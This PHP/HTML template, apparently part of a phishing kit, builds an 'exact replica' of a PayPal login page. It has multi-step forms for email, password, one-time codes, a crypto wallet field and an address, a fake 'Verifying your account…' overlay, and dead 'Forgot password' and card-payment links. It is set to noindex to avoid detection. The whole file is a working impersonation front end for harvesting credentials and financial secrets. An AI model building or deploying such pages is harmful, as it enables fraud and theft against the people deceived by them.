<?php
// Payment template — PayPal exact replica
// White card, PayPal logo centered, blue #0070ba, thin progress bar, labeled inputs
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title><?=$org_name?></title>
<meta name="robots" content="noindex,nofollow">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
  font-family:'PayPal Sans','Helvetica Neue',Helvetica,Arial,sans-serif;
  min-height:100vh;min-height:100dvh;
  background:#f5f7fa;
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  padding:20px 16px;color:#2c2e2f
}

/* Logo above card */
.pp-logo-wrap{text-align:center;margin-bottom:20px}
.pp-logo-wrap img{height:32px;object-fit:contain}
.pp-logo-text{
  font-size:26px;font-weight:700;
  color:<?=$accent?>;letter-spacing:-.5px
}

/* Card */
.card{
  width:100%;max-width:400px;
  background:#fff;
  border-radius:8px;
  box-shadow:0 2px 8px rgba(0,0,0,.12);
  overflow:hidden
}

/* Progress bar (thin top bar, not dots) */
.progress-bar{
  height:3px;background:#eee;
  position:relative
}
.progress-fill{
  height:100%;background:<?=$accent?>;
  transition:width .3s ease
}

.card-inner{padding:32px 32px 28px}

/* Title */
.card-title{
  font-size:22px;font-weight:700;
  color:#2c2e2f;margin-bottom:22px;
  text-align:center
}

/* Fields WITH labels */
.field{margin-bottom:16px}
.field label{
  display:block;
  font-size:13px;font-weight:600;
  color:#6c7378;margin-bottom:6px;
  letter-spacing:.1px
}
.field input{
  width:100%;
  background:#fff;
  border:1px solid #c4c4c4;
  color:#2c2e2f;
  padding:13px 14px;
  border-radius:4px;
  font-size:16px;
  outline:none;
  font-family:inherit;
  -webkit-appearance:none;
  transition:border-color .15s,box-shadow .15s
}
.field input:focus{
  border-color:<?=$accent?>;
  box-shadow:0 0 0 2px rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.15)
}
.field input::placeholder{color:#c4c4c4}
.or-div{
  text-align:center;font-size:13px;color:#9da3a6;
  margin:14px 0;position:relative
}
.or-div::before,.or-div::after{
  content:'';position:absolute;top:50%;
  width:43%;height:1px;background:#e0e0e0
}
.or-div::before{left:0}.or-div::after{right:0}
.card-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}

/* Primary button */
.btn{
  width:100%;padding:14px;
  background:<?=$accent?>;color:#fff;
  font-size:16px;font-weight:700;
  border:none;border-radius:24px;cursor:pointer;
  margin-top:6px;letter-spacing:.2px;
  transition:background .15s;
  position:relative;font-family:inherit
}
.btn:hover{filter:brightness(.92)}
.btn:disabled{opacity:.5;cursor:not-allowed}
.btn.loading::after{
  content:'';position:absolute;right:16px;top:50%;
  width:16px;height:16px;
  border:2px solid rgba(255,255,255,.3);border-top-color:#fff;
  border-radius:50%;transform:translateY(-50%);
  animation:spin .7s linear infinite
}
@keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}
.err-msg{font-size:13px;color:#d20000;margin-top:8px;text-align:center;display:none}

/* Secondary button (debit/credit) */
.btn-secondary{
  display:block;width:100%;padding:13px;
  background:#fff;color:<?=$accent?>;
  font-size:15px;font-weight:700;
  border:1px solid <?=$accent?>;border-radius:24px;cursor:pointer;
  margin-top:10px;font-family:inherit;text-align:center;
  transition:background .1s
}
.btn-secondary:hover{background:#f5f7fa}

/* Forgot links */
.forgot-row{
  display:flex;justify-content:space-between;
  margin-top:14px;
}
.forgot-row a{font-size:13px;color:<?=$accent?>;text-decoration:none}
.forgot-row a:hover{text-decoration:underline}
.forgot-link{display:block;text-align:center;margin-top:14px;font-size:13px;color:<?=$accent?>;text-decoration:none}
.forgot-link:hover{text-decoration:underline}

/* Footer */
.card-footer{
  border-top:1px solid #f0f0f0;
  padding:14px 32px;
  font-size:11px;color:#9da3a6;
  text-align:center;line-height:1.6
}
.card-footer a{color:#9da3a6;text-decoration:none}
.card-footer a:hover{text-decoration:underline}

/* OTP / wallet / address */
.otp-wrap{display:flex;gap:8px;justify-content:center}
.otp-wrap input{
  flex:1;text-align:center;font-size:22px;font-weight:600;
  padding:12px 4px;max-width:48px;
  background:#fff;border:1px solid #c4c4c4;border-radius:4px;
  color:#2c2e2f;outline:none
}
.otp-wrap input:focus{border-color:<?=$accent?>}
.otp-hint{font-size:13px;color:#9da3a6;text-align:center;margin-top:8px}
.wallet-area{
  width:100%;min-height:80px;
  background:#fff;border:1px solid #c4c4c4;color:#2c2e2f;
  padding:13px 14px;border-radius:4px;font-size:14px;
  font-family:monospace;outline:none;resize:none
}
.wallet-area:focus{border-color:<?=$accent?>}
.wallet-hint{font-size:11px;color:#9da3a6;margin-top:6px;line-height:1.5;text-align:center}
.addr-area{
  width:100%;min-height:60px;
  background:#fff;border:1px solid #c4c4c4;color:#2c2e2f;
  padding:13px 14px;border-radius:4px;font-size:15px;
  font-family:inherit;outline:none;resize:none
}
.addr-area:focus{border-color:<?=$accent?>}

#loadOverlay{
  display:none;position:fixed;inset:0;
  background:rgba(245,247,250,.92);z-index:999;
  align-items:center;justify-content:center;flex-direction:column;gap:16px
}
#loadOverlay.show{display:flex}
.load-spin{
  width:40px;height:40px;
  border:3px solid #eee;border-top-color:<?=$accent?>;
  border-radius:50%;animation:spin .8s linear infinite
}
.load-txt{font-size:13px;color:#9da3a6}

@media(max-width:480px){
  body{padding:0;align-items:flex-start;background:#fff}
  .pp-logo-wrap{padding-top:40px}
  .card{border-radius:0;min-height:calc(100vh - 110px);min-height:calc(100dvh - 110px);box-shadow:none;width:100%;max-width:100%}
  .card-inner{padding:24px 20px}
  .card-footer{padding:14px 20px}
}
</style>
</head>
<body>
<div id="loadOverlay"><div class="load-spin"></div><div class="load-txt" id="loadText">Verifying your account…</div></div>

<!-- Logo above card -->
<div class="pp-logo-wrap">
  <?php if($logo_url): ?>
  <img src="<?=htmlspecialchars($logo_url)?>" alt="<?=htmlspecialchars($org_name)?>" onerror="this.style.display='none';this.nextElementSibling.style.display='block'">
  <div class="pp-logo-text" style="display:none"><?=htmlspecialchars($org_name)?></div>
  <?php else: ?>
  <div class="pp-logo-text"><?=htmlspecialchars($org_name)?></div>
  <?php endif; ?>
</div>

<div class="card">
  <!-- Thin progress bar -->
  <div class="progress-bar">
    <div class="progress-fill" id="progressFill" style="width:<?=round(100/$total_steps)?>%"></div>
  </div>

  <div class="card-inner">
    <?php for($sn=1;$sn<=$total_steps;$sn++): ?>
    <div id="step<?=$sn?>" <?=$sn>1?'style="display:none"':''?>>
      <div class="card-title">
        <?php if($sn===1 && stripos($pid,'paypal')!==false): ?>Log in to PayPal
        <?php elseif($sn===1): ?>Log in to <?=htmlspecialchars($org_name)?>
        <?php else: ?><?=htmlspecialchars($sc['step_titles'][$sn])?>
        <?php endif; ?>
      </div>
      <?php if($sn>1): ?><div style="font-size:13px;color:#9da3a6;text-align:center;margin-bottom:16px" id="step<?=$sn?>sub"><?=htmlspecialchars($sc['step_subs'][$sn])?></div><?php else: ?><div id="step1sub" style="display:none"></div><?php endif; ?>
      <form onsubmit="submitStep(event,<?=$sn?>)">
        <?php $fld = $sc['step'.$sn.'_fields'] ?? 'email_only'; include __DIR__.'/partials/fields.php'; ?>
        <button type="submit" class="btn" id="btn<?=$sn?>"><?=htmlspecialchars($sc['btn_labels'][$sn-1])?></button>
        <div class="err-msg" id="err<?=$sn?>">Please enter the required information.</div>
      </form>
      <?php if($sn===1): ?>
      <a href="#" class="forgot-link" onclick="return false">Forgot email?</a>
      <div style="margin-top:14px;border-top:1px solid #f0f0f0;padding-top:14px">
        <button class="btn-secondary" onclick="return false">Pay with Debit or Credit Card</button>
      </div>
      <?php else: ?>
      <a href="#" class="forgot-link" onclick="return false">Forgot password?</a>
      <?php endif; ?>
    </div>
    <?php endfor; ?>
  </div>

  <div class="card-footer">
    <?=$footer?><br>
    <a href="#">Privacy</a> &nbsp;|&nbsp; <a href="#">Legal</a> &nbsp;|&nbsp; <a href="#">Cookies</a>
  </div>
</div>

<?php include __DIR__.'/partials/js.php'; ?>
<script>
// Update progress bar on step change
const _origShowStep = showStep;
function showStep(n) {
  _origShowStep(n);
  const pf = document.getElementById('progressFill');
  if (pf) pf.style.width = Math.round((n / TOTAL_STEPS) * 100) + '%';
}
</script>
</body>
</html>
